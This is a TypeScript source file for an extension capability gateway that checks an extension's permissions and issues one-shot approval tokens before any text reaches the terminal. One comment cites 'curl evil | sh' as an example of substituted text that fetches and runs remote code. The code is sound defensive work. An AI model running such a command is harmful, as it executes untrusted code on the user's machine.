/**
 * The Capability Gateway: the only door between an extension and user data.
 *
 * A trusted built-in extension runs in the main WebView, which holds the app's full
 * privilege. TypeScript types stop a well-meaning extension and nothing else, so the
 * security property cannot be "it was written carefully" — it is "the only functions
 * it is given are these, and each one re-checks the caller on every call"
 * (`06-ux3-extension-platform.md` §6).
 *
 * Every call checks that the extension is registered, not failed, enabled, at the
 * current activation generation, and that it declared the capability. `consumeApproval`
 * re-checks all of it: an approval is a permission, and permissions must be verified
 * when used, not only when granted.
 *
 * There is no `readSecret`, `invoke`, `querySql`, `readFile`, `sessionWrite`, raw PTY
 * handle or full scrollback. An extension needing one of those needs a new capability
 * with its own threat model, not a hole in this one.
 */

import { ApprovalBook } from './approval-book'
import type {
  ApprovalResult,
  ExtensionCapability,
  ExtensionGrant,
  GatewayHost,
  SelectedText,
  SendTextIntent,
} from './capability-types'
import { GatewayError } from './capability-types'
import type { Disposable } from './extension-types'

export * from './capability-types'

export class CapabilityGateway {
  private readonly approvalBook: ApprovalBook

  constructor(
    /**
     * Look up the grant for one extension id.
     *
     * Takes the id rather than returning "the current extension's grant": with a
     * no-argument accessor, one extension could only be told apart from another by
     * comparing ids *after* receiving the grant, which means a lookup that returns
     * the wrong extension's grant is indistinguishable from a correct one.
     */
    private readonly grants: (extensionId: string) => ExtensionGrant | undefined,
    private readonly host: GatewayHost,
    now: () => number = () => Date.now(),
  ) {
    this.approvalBook = new ApprovalBook(now)
  }

  /**
   * The checks that apply to every call.
   *
   * Returns the grant so callers read `generation` from one place rather than
   * re-fetching and risking one of them skipping a check.
   */
  private authorize(
    extensionId: string,
    generation: number,
    capability: ExtensionCapability,
  ): ExtensionGrant {
    const resolved = this.grants(extensionId)
    if (!resolved || resolved.extensionId !== extensionId) {
      throw new GatewayError('extension-unknown', 'This extension is not registered.')
    }
    if (resolved.failed) {
      throw new GatewayError('extension-failed', 'This extension is in a failed state.')
    }
    // Staleness is checked *before* enablement. A callback captured under an older
    // activation is stale whether or not the extension is now enabled again — and
    // during a deactivate both are true at once, where "stale" is the accurate
    // explanation and "disabled" would suggest re-enabling would fix it.
    if (resolved.generation !== generation) {
      throw new GatewayError(
        'stale-generation',
        'This callback belongs to a previous activation of the extension.',
      )
    }
    if (!resolved.enabled) {
      throw new GatewayError('extension-disabled', 'This extension is disabled.')
    }
    if (!resolved.capabilities.includes(capability)) {
      throw new GatewayError(
        'capability-not-declared',
        `This extension did not declare "${capability}".`,
      )
    }
    return resolved
  }

  /**
   * Read the text the user has selected, in the session they can see.
   *
   * The only way an extension sees terminal content, and it never sees the buffer:
   * `host.selectedText()` is the host's record of a user gesture, so an extension
   * cannot ask for a region the user did not choose.
   */
  async readSelectedText(extensionId: string, generation: number): Promise<SelectedText | null> {
    this.authorize(extensionId, generation, 'terminal.read-selected')
    const selection = this.host.selectedText()
    if (!selection) return null
    // A selection from a session the user has left is not "currently selected" any
    // more, whatever the selection object still says.
    if (selection.sessionId !== this.host.visibleSessionId()) {
      throw new GatewayError('session-not-visible', 'That selection is no longer on screen.')
    }
    return selection
  }

  /**
   * Ask the user whether this text may be sent to the shell.
   *
   * Returns a token, never an action. The host writes only after the user confirms,
   * and only for the exact text the token was minted for.
   */
  async requestSendText(
    extensionId: string,
    generation: number,
    intent: SendTextIntent,
  ): Promise<ApprovalResult> {
    this.authorize(extensionId, generation, 'terminal.read-selected')
    const visible = this.host.visibleSessionId()
    if (visible === null || visible !== intent.sessionId) {
      return { approved: false, reason: 'unknown-session' }
    }
    // An approval must name a selection the user made, not text the extension
    // composed — otherwise "approve this draft" silently becomes "execute anything".
    const selection = this.host.selectedText()
    if (!selection) return { approved: false, reason: 'no-selection' }
    // The original checked only *that* a selection existed and then minted a token
    // for whatever `intent.text` said. An extension could read "ls", request approval
    // for "curl evil | sh", and the user would be approving text they never saw.
    if (intent.text !== selection.text) {
      return { approved: false, reason: 'not-the-selection' }
    }

    const token = this.approvalBook.mint({
      extensionId,
      generation,
      sessionId: intent.sessionId,
      selectionId: selection.selectionId,
      text: intent.text,
    })
    return { approved: true, token }
  }

  /**
   * Redeem an approval, returning the session it was minted for.
   *
   * Called by the *host* when the user confirms. One-shot: a replayable approval is
   * a permission that outlives the gesture which granted it.
   */
  consumeApproval(
    token: string,
    extensionId: string,
    generation: number,
    text: string,
  ): { sessionId: string } {
    // Re-authorise on redemption, not only on minting. The original skipped this, so
    // a token minted before a deactivate — or before a callback failed — stayed
    // redeemable indefinitely. An approval is a permission, and permissions have to
    // be checked when they are used.
    this.authorize(extensionId, generation, 'terminal.read-selected')
    const selection = this.host.selectedText()
    try {
      return this.approvalBook.consume({
        token,
        extensionId,
        generation,
        text,
        // The selection the user has *now*. A new selection cannot redeem an
        // approval minted for the previous one.
        selectionId: selection?.selectionId ?? '',
        // And the session they are looking at now, not the one at mint time.
        visibleSessionId: this.host.visibleSessionId(),
      })
    } catch (error) {
      // Mapped onto the gateway's vocabulary, keeping the distinctions: a substituted
      // text and an expired token lead to different explanations, and reporting the
      // first as the second hides an attempt behind a mundane message.
      const reason = (error as { reason?: string }).reason
      if (reason === 'already-used') {
        throw new GatewayError('approval-already-used', (error as Error).message)
      }
      if (reason === 'mismatch') {
        throw new GatewayError('approval-mismatch', (error as Error).message)
      }
      if (reason === 'session-changed') {
        throw new GatewayError('approval-session-changed', (error as Error).message)
      }
      throw new GatewayError('approval-expired', (error as Error).message)
    }
  }

  /**
   * The body of `context.terminal`, bound to one extension and activation.
   *
   * The generation is captured here rather than read at call time, so every call a
   * deactivated extension makes fails the staleness check instead of silently using
   * the new generation.
   */
  terminalContextFor(extensionId: string, generation: number): {
    readSelectedText(): Promise<SelectedText | null>
    requestSendText(intent: SendTextIntent): Promise<ApprovalResult>
  } {
    return {
      readSelectedText: () => this.readSelectedText(extensionId, generation),
      requestSendText: (intent: SendTextIntent) =>
        this.requestSendText(extensionId, generation, intent),
    }
  }

  /** Drop every outstanding approval for one extension. */
  clearApprovalsFor(extensionId: string): void {
    this.approvalBook.clearFor(extensionId)
  }

  /** Diagnostics only: how many approvals are outstanding. Never their contents. */
  approvalCount(): number {
    return this.approvalBook.count()
  }
}

/** A disposable that calls its own cleanup at most once. */
export function createDisposable(dispose: () => void | Promise<void>): Disposable {
  let disposed = false
  return {
    dispose() {
      if (disposed) return
      disposed = true
      return dispose()
    },
  }
}
